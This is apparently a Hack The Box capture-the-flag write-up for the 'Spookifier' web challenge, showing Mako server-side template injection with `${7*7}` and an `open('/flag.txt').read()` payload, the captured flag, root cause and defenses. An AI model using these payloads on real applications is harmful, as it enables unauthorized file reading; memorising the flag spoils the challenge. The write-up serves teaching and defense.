---
title: "Spookifier"
description: "Exploiting SSTI in Mako to evaluate expressions and read a flag from a system file."
platform: "Hack The Box"
category: "Web"
difficulty: "Easy"
publishedAt: 2026-08-08
tags: ["web", "ssti", "mako", "python", "file-read"]
language: "en"
translationKey: "hack-the-box/spookifier"
draft: false
featured: false
cover: "/images/spookifier/spookifier-05.png"
---

> This write-up was conducted in a controlled lab environment. Only apply the techniques below on systems you are authorized to test.

## Overview

Spookifier is an application that transforms a user name into several Halloween-style fonts. The input appears directly in the URL through the `text` parameter, so the first question is whether that value is passed into a template engine.

The vulnerability is **Server-Side Template Injection (SSTI)** in Mako. After confirming expression evaluation, Mako can be used to read `/flag.txt`.

## Reconnaissance

The challenge exposes a web service at:

```text
http://154.57.164.73:31608/
```

The home page accepts input through the `text` query parameter:

```text
http://154.57.164.73:31608/?text=abc
```

![Spookifier page with abc as the input](https://tameruict.github.io/images/spookifier/spookifier-01.png)

![Spookifier page after submitting testtt](https://tameruict.github.io/images/spookifier/spookifier-06.png)

The value is displayed again in several fonts. User input flowing directly through the URL and being rendered multiple times is a useful signal to test for SSTI.

## Source Code Analysis

The source shows that the application uses Mako:

![Source code importing Mako and creating a template](https://tameruict.github.io/images/spookifier/spookifier-02.png)

```python
from mako.template import Template
```

In `routes.py`, request data is passed to `spookify` and then into the template:

![Route reading the text parameter and calling spookify](https://tameruict.github.io/images/spookifier/spookifier-03.png)

```python
text = request.args.get('text')
if text:
    converted = spookify(text)
    return render_template('index.html', output=converted)
```

The rendering helper creates a Mako template from the resulting string and calls `.render()`:

```python
return Template(result).render()
```

Because `result` contains data originating from `text`, Mako expressions inside the input can be evaluated on the server.

## Solution

### 1. Confirm SSTI

Send a simple Mako expression:

```text
http://154.57.164.73:31608/?text=${7*7}
```

The page renders `49`. This confirms that `${...}` is processed by Mako instead of being displayed as plain text.

![49 rendered after testing the SSTI expression](https://tameruict.github.io/images/spookifier/spookifier-04.png)

### 2. Read the flag

Mako exposes `open` in the challenge context. The file-reading payload is:

```text
${open('/flag.txt').read()}
```

When sending it in a URL, the single quotes can be URL-encoded as `%27`:

```text
http://154.57.164.73:31608/?text=${open(%27/flag.txt%27).read()}
```

The response contains:

![Flag returned by the file-reading payload](https://tameruict.github.io/images/spookifier/spookifier-05.png)

```text
HTB{t3mp1at3_1nj3ct10n_c4n_3x1s+5_4nywh3r3!}
```

## Root Cause

The application creates a new Mako template from a string containing user input and then calls `Template(result).render()`. This is fundamentally different from passing data into a fixed template: in the vulnerable version, user input becomes template source and can therefore become executable template code.

## Defense

- Never create a template from user-controlled data. Use a fixed template and pass the name to display through the context.
- Escape output for the correct context; do not rely on blacklisting `${...}` patterns.
- If dynamic templates are unavoidable, restrict the context, callables, and modules that can be accessed; never expose functions such as `open`.
- Run the service with least privilege, separate secrets from the web process, and block access to files the service does not need.
- Add unit and security tests for inputs that pass through Mako/Jinja2, and monitor unusual expressions in query strings.

## Lessons Learned

The key signal was data appearing in the URL but being processed on the server. A small expression such as `${7*7}` is enough to distinguish normal output formatting from actual SSTI.
